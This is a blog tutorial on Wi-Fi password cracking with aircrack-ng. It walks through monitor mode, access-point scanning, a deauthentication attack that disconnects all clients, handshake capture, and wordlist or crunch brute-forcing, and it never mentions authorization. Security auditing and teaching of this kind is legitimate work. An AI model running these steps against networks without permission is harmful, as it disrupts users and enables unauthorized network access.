---
date: '2016-12-25'
tags:
- aircrack-ng
- security
- hacking
- kali linux
title: Cracking Passwords With aircrack-ng
---

aircrack-ng is a powerful suite of tools that allows to assess wireless network security. The tools in the suite allows us to perform various actions such as packet monitoring in the environment, montoring of specific access points, de-authentication attacks on access points, and cracking of WEP and WPA PSK (WPA 1 and 2) passwords.

![aircrack-ng](http://www.aircrack-ng.org/resources/aircrack-ng-new-logo.jpg)

In this post I will explain on how to perform these actions.

## Wireless Card Monitor Mode

Before we begin it is crucial that we change the mode of our wireless network card to **monitor mode**. BY default, our wireless network card's mode is **managed mode**. In managed mode, the network card generally only listens to packets addressed to the card, whereas in monitor mode it will hear **every packet in the air**. Additionally, monitor mode will also allows us to perform packet injection attacks (i.e. de-authentication attacks).

To set our network card into monitor mode, we can run the following commands in a terminal:

````
ifconfig wlan0 down
iwconfig wlan0 mode monitor
ifconfig wlan0 up
```

The above commands sometimes might not work, which is why I prefer the following approach:

```
airmon-ng check kill
airmon-ng start <interface>
```

Where `<interface>` stands for the name of your wireless interface, which is usually `wlan0`. The above command will also kill any possible interfering processes, such as the `NetworkManager` process.

However, we can still check for possible interfering process by running this command:

```
airmon-ng check <interface>
```

<!--more-->

## Scanning The Environment

We can now proceed to scan the environment to discover what sort of connections we have and see what is connected to which network.

We can take a look at the wireless access points using:

````
airodump-ng <interface>
````

The output will reveal some interesting data:

- PWR: The signal. The higher the number, the better the signal.

## Scanning Specific Access Points

We can perform a more precise and specific scan using this command:

```
airodump-ng -c <channel> --bssid <bssid> -w <file> <interface>
```

Where:

- `-c` stands for the channel.
- `--bssid` stands for the MAC address of the access point.
- `-w` stands for the output file to write to.

The command will output a scan on the access point. Additionally, it will also show devices (`STATION`) connected to this access point.

**NOTE:** In order to crack the key, **at least 1 device must be connected to the access point**.

## De-authentication Attacks

We can use `aireplay-ng` to perform a de-authentication attack. For example:

```
aireplay-ng -0 0 -a <access_point_bssid> <interface>
```

Where:

- `-0` represents the amount of de-authentication transmissions we wish to send. A `0` stands for an infinite loop.
- `-a` represents the wireless access point's MAC address.

This de-authentication attack will start injecting packets to the access point. Causing all the client's connected to the access point to almost immediately disconnect, until the attack is finished.

It is also possible to target specific clients by adding the `-c <client_mac_address>` option.

After some time, we will stop the attack so that the previously connected clients can re-connect to the access point and generate the **[handshake](https://en.wikipedia.org/wiki/Handshaking)** packet data, which will be collected by the scan we will be running in another terminal. This handshake data is what we will use to crack the password.

## Cracking Passwords

To begin cracking passwords we can use the `aircrack-ng` tool:

```
aircrack-ng -w [word list or file] -e <essid> <capture file>
```

Where `-w` stands for the word list or password. These can be found online for download. It is worth noting that the region's spoken language where the cracking is being done is important when using a word list.

The command can further be used with `crunch`. For example:

```
crunch <min-len> <max-len> -t <pattern> | aircrack-ng -w - -e <essid> <capture_file>
```

Where:

- `-t` stands for a certain pattern to be filled with wildcard characters.
- `-` passed to `-w` means to read from Standard Output (in this case, output from crunch).

### Using Crunch

Crunch is a tool that can generate wordlists from character sets. These generated wordlists is the input that will be fed to **aircrack-ng**. For example, assuming that the access point's password is *hello123*, we can specify a pattern that tries to match that password:

```
crunch 8 8 -t hello%%%
```

We can also specify a character set using the `-f` option:

```
crunch <min-len> <max-len> -t <pattern> -f /usr/share/crunch/charset.lst <charsetname>
```

Where the character's set name can be found inside the character set file.

It is important to keep in mind that a prior knowledge of the password's structure is needed. Otherwise the cracking process is practically **impossible** because of the lack of processing power and time required to crack a password from the thousands of possible existing combinations.